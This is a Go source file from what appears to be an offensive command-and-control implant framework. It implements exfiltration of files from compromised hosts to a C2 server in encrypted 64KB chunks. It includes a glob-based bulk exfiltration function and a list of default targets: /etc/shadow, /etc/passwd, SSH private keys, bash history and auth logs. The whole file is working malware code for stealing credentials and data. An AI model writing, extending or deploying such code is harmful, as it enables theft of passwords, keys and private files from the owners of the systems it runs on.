// Package agent provides exfiltration capabilities.
//
// Exfiltration uploads files from compromised hosts to the C2 server
// in chunked, encrypted format. Each chunk is 64KB, encrypted with
// XChaCha20-Poly1305, and transmitted over the C2 channel.
package agent

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	"github.com/ruby570bocadito/vesper/internal/crypto"
	"github.com/ruby570bocadito/vesper/pkg/shared/logger"
)

const chunkSize = 64 * 1024 // 64KB chunks

// ExfilManager handles file exfiltration from the agent to C2.
type ExfilManager struct {
	log     *logger.Logger
	session *crypto.Session
}

// NewExfilManager creates an exfiltration manager.
func NewExfilManager(log *logger.Logger, session *crypto.Session) *ExfilManager {
	return &ExfilManager{log: log, session: session}
}

// ExfilResult is the result of an exfiltration operation.
type ExfilResult struct {
	Filename  string `json:"filename"`
	TotalSize int64  `json:"total_size"`
	Chunks    int    `json:"chunks"`
	Status    string `json:"status"`
	Error     string `json:"error,omitempty"`
	ElapsedMs int64  `json:"elapsed_ms"`
}

// ExfilFile uploads a file to the C2 in chunked encrypted format.
func (e *ExfilManager) ExfilFile(ctx context.Context, path string, sendFunc func([]byte) error) (*ExfilResult, error) {
	start := time.Now()

	info, err := os.Stat(path)
	if err != nil {
		return nil, fmt.Errorf("stat %s: %w", path, err)
	}

	if info.IsDir() {
		return nil, fmt.Errorf("cannot exfiltrate directory: %s", path)
	}

	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("opening %s: %w", path, err)
	}
	defer f.Close()

	result := &ExfilResult{
		Filename:  filepath.Base(path),
		TotalSize: info.Size(),
	}

	e.log.Infof("starting exfiltration: %s (%d bytes)", path, info.Size())

	totalChunks := int((info.Size() + chunkSize - 1) / chunkSize)
	buf := make([]byte, chunkSize)

	for i := 0; i < totalChunks; i++ {
		// Check context cancellation
		select {
		case <-ctx.Done():
			result.Status = "cancelled"
			result.Chunks = i
			return result, ctx.Err()
		default:
		}

		n, err := f.Read(buf)
		if err != nil && err != io.EOF {
			result.Status = "error"
			result.Error = err.Error()
			result.Chunks = i
			return result, err
		}

		if n == 0 {
			break
		}

		// Encrypt chunk
		var encrypted []byte
		if e.session != nil {
			encrypted, err = e.session.Encrypt(buf[:n])
			if err != nil {
				return result, fmt.Errorf("encrypting chunk %d: %w", i, err)
			}
		} else {
			encrypted = buf[:n]
		}

		// Send to C2
		if err := sendFunc(encrypted); err != nil {
			result.Status = "error"
			result.Error = fmt.Sprintf("sending chunk %d: %v", i, err)
			result.Chunks = i
			return result, err
		}

		e.log.Debugf("exfil chunk %d/%d: %d bytes sent", i+1, totalChunks, n)
	}

	result.Status = "complete"
	result.Chunks = totalChunks
	result.ElapsedMs = time.Since(start).Milliseconds()

	e.log.Infof("exfiltration complete: %s (%d bytes, %d chunks, %dms)",
		result.Filename, result.TotalSize, result.Chunks, result.ElapsedMs)

	return result, nil
}

// ExfilGlob exfiltrates all files matching a glob pattern.
func (e *ExfilManager) ExfilGlob(ctx context.Context, pattern string, sendFunc func([]byte) error) ([]*ExfilResult, error) {
	matches, err := filepath.Glob(pattern)
	if err != nil {
		return nil, fmt.Errorf("glob %s: %w", pattern, err)
	}

	var results []*ExfilResult
	for _, m := range matches {
		result, err := e.ExfilFile(ctx, m, sendFunc)
		if err != nil {
			results = append(results, &ExfilResult{Filename: m, Status: "error", Error: err.Error()})
		} else {
			results = append(results, result)
		}
	}

	return results, nil
}

// Common exfiltration targets.
func CommonTargets() []string {
	return []string{
		"/etc/shadow",
		"/etc/passwd",
		"/etc/hosts",
		os.Getenv("HOME") + "/.ssh/id_rsa",
		os.Getenv("HOME") + "/.bash_history",
		"/var/log/auth.log",
	}
}
